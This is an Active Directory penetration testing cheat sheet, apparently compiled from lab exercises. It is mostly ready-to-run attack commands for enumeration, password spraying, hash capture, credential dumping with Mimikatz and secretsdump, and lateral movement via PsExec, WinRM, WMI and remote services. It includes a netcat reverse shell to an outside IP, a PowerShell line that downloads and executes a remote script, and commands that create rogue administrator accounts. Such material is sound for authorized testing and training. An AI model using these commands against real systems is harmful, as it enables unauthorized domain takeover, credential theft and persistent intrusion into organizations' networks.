# Active Directory Penetration Testing Guide

This document provides commands and techniques for Active Directory enumeration,
exploitation, and lateral movement.

---

## 0. Triage — Where To Start

The order you enumerate in matters more than the commands below. Work left to right:

```text
  no creds  ->  valid creds  ->  privileged creds  ->  DA / SYSTEM
 (anonymous)    (a user)        (admin somewhere)
```

### Classify the box from the port profile

Read the port list before touching any service.

| You see...                            | It's a...                     | Primary path                            |
|---------------------------------------|-------------------------------|-----------------------------------------|
| 88, 389, 445, 636, 3268, 9389         | Domain Controller             | AD enum (SMB/LDAP/Kerberos), not web    |
| 445 + 5985, no 88/389                 | Standalone / member server    | SMB shares, web apps, then creds        |
| 80/443 only, few others               | Web-focused                   | Web is genuinely the path               |
| Weird high port (8443/8080/8000)      | Non-standard app              | Almost always significant — fingerprint |

Scan all ports; the non-standard one is often the whole game.

```bash
nmap -sT -p- --min-rate 2500 -T4 --open -n -Pn -oN full-tcp.nmap "$IP"
nmap -sT -sV -sC -p "$PORTS" -n -Pn -oN services.nmap "$IP"
```

Record three things off the script scan: the **domain name**, whether **SMB signing** is required
(required = no relay), and the **clock skew** (Kerberos fails over 5 minutes of drift).

### Unauthenticated credential sources, in priority order

1. **SMB** — null session, then guest, then share hunting. Section 1 below, and `common nxc`.
2. **LDAP** — anonymous bind and RootDSE. See `common ldap`.
3. **Kerberos** — AS-REP roast as soon as you hold any username list.
4. **Web** (80/443/8443) — now, not first. Fingerprint the app before dir-busting.
5. **RPC** — `rpcclient -U '' -N`, RID cycling.

```bash
nxc smb "$IP" -u '' -p '' --shares        # null session
nxc smb "$IP" -u guest -p '' --shares     # guest fallback
nxc smb "$IP" -u a -p '' --shares         # any-name-maps-to-guest
enum4linux-ng -A "$IP"
ldapsearch -x -H "ldap://$IP" -s base namingcontexts
rpcclient -U '' -N "$IP"
impacket-GetNPUsers 'domain.htb/' -dc-ip "$IP" -usersfile users.txt -no-pass -format hashcat
```

A non-default readable share is the top unauthenticated loot source — pull it whole, grep offline:

```bash
smbclient "//$IP/$SHARE" -U 'guest%' -Tc out.tar
grep -rniE 'password|passwd|secret|credential|api_key|connectionstring' .
grep -rl 'ANSIBLE_VAULT' .
```

Read the output carefully: a `(Guest)` tag on a `[+]` means it fell back to Guest, not a real login;
a successful null *bind* is not null *read* access; and `nxc` over LDAPS can report a false `[+]` for
a bad bind — control-test with a garbage username and password before trusting it.

### The moment you get any credential

Re-run the entire enumeration authenticated. This is the step that gets skipped, and skipping it is
why engagements stall. Fire BloodHound and certipy immediately — they answer "how do I escalate"
better than manual poking.

```bash
nxc smb  "$IP" -u "$U" -p "$P" --shares --users --groups --pass-pol
nxc smb  "$IP" -u "$U" -p "$P" -M spider_plus
nxc ldap "$IP" -u "$U" -p "$P" -M maq
bloodhound-python -u "$U" -p "$P" -d "$DOMAIN" -ns "$IP" -c all --zip
certipy find -u "$U" -p "$P" -dc-ip "$IP" -vulnerable -stdout
impacket-GetUserSPNs "$DOMAIN/$U:$P" -dc-ip "$IP" -request
```

Then spray it everywhere — one credential is a credential for every service until proven otherwise:

```bash
nxc smb   "$IP" -u users.txt -p "$P" --continue-on-success
nxc winrm "$IP" -u "$U" -p "$P"      # Pwn3d! = local admin
nxc mssql "$IP" -u "$U" -p "$P"
nxc ldap  "$IP" -u "$U" -p "$P"
```

### Stuck? Work down this list

Being stuck almost always means something has not been enumerated *authenticated*.

- [ ] Pulled and grepped every readable share (vaults, web.config, unattend.xml, *.kdbx, scripts)?
- [ ] Ran BloodHound and checked outbound object control / shortest path to DA?
- [ ] Checked ADCS (`certipy find -vulnerable`)?
- [ ] AS-REP roasted and Kerberoasted?
- [ ] Sprayed every known credential across all users and all services?
- [ ] Fingerprinted every non-standard port, not just 80?
- [ ] Tried the creds against MSSQL (1433) / WinRM (5985) / RDP (3389)?
- [ ] Checked MachineAccountQuota — can you add a computer for RBCD or ADCS?
- [ ] Reused any decrypted config password as a domain credential?

### Privesc path selector

| Finding                                   | Technique                                             |
|-------------------------------------------|-------------------------------------------------------|
| ESC1 template + EnrolleeSuppliesSubject   | `certipy req -upn administrator@d -template T`        |
| PKINIT fails KDC_ERR_PADATA_TYPE_NOSUPP   | pass-the-cert over LDAPS (passthecert.py) — schannel  |
| Cert auth as admin over LDAP              | `-elevate` (grant DCSync) -> secretsdump -> PtH       |
| GenericWrite / GenericAll on user         | targeted Kerberoast, Shadow Credentials, or pw reset  |
| GenericWrite on computer                  | RBCD (`rbcd.py`) -> S4U -> admin service ticket       |
| WriteDACL on domain                       | grant self DCSync -> secretsdump                      |
| Admin NT hash                             | `nxc winrm "$IP" -u administrator -H <hash>` (PtH)    |
| SMB signing not required                  | relay to a second host (ntlmrelayx)                   |

### One-line version

Classify the box -> exhaust unauth cred sources (SMB shares first) -> the second you have a cred,
re-run everything authenticated and immediately fire BloodHound + certipy -> spray creds everywhere
-> repeat until DA.

Port 80 is step ~4 of ~7 on a DC, not step 2.

---

## 1. Enumeration Techniques

### Basic Command Line Enumeration (net commands)

```bash
# List all domain users
net user /domain

# Get specific user details
net user <username> /domain

# List all domain groups
net group /domain

# Get specific group details
net group "<domain group name>" /domain

# Get domain password policy
net account /domain
```

### PowerShell AD Module Commands

```bash
# Get user information (requires AD module)
Get-ADUser -Identity <username> -Server <Domain controller> -Properties *
# Filter users: -Filter 'Name -like "dawid"'
# Table view: | Format-Table Name,SamAccountName -A

# Get group information
Get-ADGroup -Identity Administrators -Server za.tryhackme.com

# Get group members
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com

# Search for recently changed objects
Get-ADObject -filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com

# Check for account lockouts
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com

# Get domain information
Get-ADDomain -Server za.tryhackme.com
```

### User Account Management

```powershell
# Change user password
Set-ADAccountPassword <user> -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose

# Force password change at next login
Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose

# Change specific user's password
Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```

### Advanced Enumeration Tools

#### BloodHound / SharpHound

```bash
# Using BloodHound Python from Linux
bloodhound-python -d <domain> -u <user> -p <password> -ns $IP -c all
bloodhound-python -d <domain> -u <user> -p <password> -ns $IP -gc <hostname> -c all

# Using SharpHound from Windows
Sharphound.exe --CollectionMethods all --Domain za.tryhackme.com --ExcludeDCs

# PowerShell execution of SharpHound
IEX (New-Object System.Net.WebClient).DownloadString('http://10.50.54.101/SharpHound.ps1')
Invoke-Bloodhound -CollectionMethod all
```

#### LDAP Enumeration

```bash
# LDAP domain dump
ldapdomaindump 192.168.0.53 -u 'whirley\userb' -p 'Password1234!'

# PlumHound for reporting
ipython3 PlumHound.py -x tasks/default.tasks -p '<neo4j password>'

# bh-hunt: run the CE query pack against neo4j and flag red flags (no cypher-shell needed)
bh-hunt -H <bloodhound-host> --owned 'SVC@DOM,BOB@DOM'
bh-hunt -H <bloodhound-host> --min-severity high --json loot.json
```

#### PingCastle

```powershell
# Active Directory security assessment
.\PingCastle.exe
```

#### Impacket Tools

```bash
# Find and request service principal names (Kerberoasting)
impacket-GetUserSPNs <domain>/<user>:<password> -request

# Find users with pre-authentication disabled (ASREPRoasting)
impacket-GetNPUser <domain>/<user>:<password>

# List domain users
impacket-GetADUsers <domain>/<user>:<password> -all

# Dump credentials with admin access
secretsdump.py <domain>/administrator:'<password>'@$IP
```

---

## 2. Initial Access Techniques

### Password Spraying

```bash
# Using custom script
python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com
```

### Authentication Relay (Responder)

```bash
# Start Responder to capture hashes
responder -I <interface>

# Crack captured hashes
hashcat capture.hash passwords

# Trigger from victim machine with:
# \\<Attack IP> or net use \\<AttackIP>
```

### LDAP Credential Capture

```bash
# Setup LDAP server
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
sudo systemctl start slapd

# Create LDIF file to downgrade auth security
cat olcSaslSecProps.ldif
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred

# Apply changes
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif

# Verify PLAIN auth is enabled
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms

# Capture authentication attempts
sudo tcpdump -SX -i breachad tcp port 389
```

### Microsoft Deployment Toolkit Exploitation

```bash
# Get boot configuration data
tftp -i <MDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd

# Extract WIM path
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile

# Download WIM file
tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim

# Extract credentials
Get-FindCredentials -WimFile .\pxeboot.wim
```

---

## 3. Lateral Movement Techniques

### Test Credential Access

```bash
# Verify credentials (Kerberos auth)
dir \\<domain.name>\SYSVOL

# Verify credentials (NTLM auth)
dir \\<DC IP>\SYSVOL

# Run command as domain user
runas /netonly /user:<domain>\<user> cmd.exe
```

### Remote Process Execution

#### PSExec

```bash
# Remote command execution (requires SMB 445/TCP and Administrator access)
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

#### WinRM/PowerShell Remoting

```bash
# Using WinRS (requires 5985/TCP or 5986/TCP)
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

# With Kerberos ticket
winrs.exe -r:target cmd

# PowerShell remoting
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
Enter-PSSession -Computername TARGET -Credential $credential
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}

# Using Evil-WinRM
evil-winrm -i $IP -u 'Administrator' -p password cmd.exe
```

#### Remote Service Creation

```bash
# Create and manage services remotely (requires ports 135, 445, 139)
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

#### Remote Scheduled Tasks

```bash
# Create remote task
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00

# Run task
schtasks /s TARGET /run /TN "THMtask1"

# Delete task
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

### WMI-Based Techniques

#### WMI Authentication Setup

```powershell
# Create credential object for authentication
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

# Create WMI/CIM session with DCOM protocol
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

#### Remote Command Execution via WMI

```powershell
# Execute a command remotely (requires ports 135/TCP, 49152-65535/TCP)
# Required group: Administrators
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command }

# Alternative method using command prompt
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```

#### Remote Service Management via WMI

```powershell
# Create a new service remotely
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
    Name = "THMService2";
    DisplayName = "THMService2";
    PathName = "net user munra2 Pass123 /add"; # Your payload
    ServiceType = [byte]::Parse("16"); # Win32OwnProcess: Start service in a new process
    StartMode = "Manual"
}

# Get reference to the service
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

# Start the service
Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stop and delete the service when finished
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

#### Software Installation via WMI

```powershell
# Install MSI package remotely using PowerShell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
    PackageLocation = "C:\Windows\myinstaller.msi";
    Options = "";
    AllUsers = $false
}

# Install MSI package remotely using WMIC
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

### Pass-the-Hash (NTLM) Authentication

#### Extract Hashes

```bash
# Using Mimikatz to dump local SAM database
privilege::debug   
token::elevate    # Get system privileges
lsadump::sam

# Extract credentials from LSASS memory
privilege::debug
token::elevate
sekurlsa::msv
```

#### Use NTLM Hashes for Authentication

```bash
# Need to revert token before using PTH
token::revert 
# Use NTLM hash to execute commands
sekurlsa::pth /user:<user.name> /domain:<domain.full.com> /ntlm:<hash> /run:"c:\my command"

# Example with specific command
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.67.205"

# RDP access using hash
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

# Command execution using Impacket's PsExec
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP

# PowerShell remoting with hash
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

---

## 4. Miscellaneous Techniques

### Config File Analysis

```bash
# Example: Analyze McAfee database for credentials
sqlitebrowser ma.db
```

### Local Admin Access Check

```powershell
# Identify machines where your account has admin access
Find-LocalAdminAccess
```
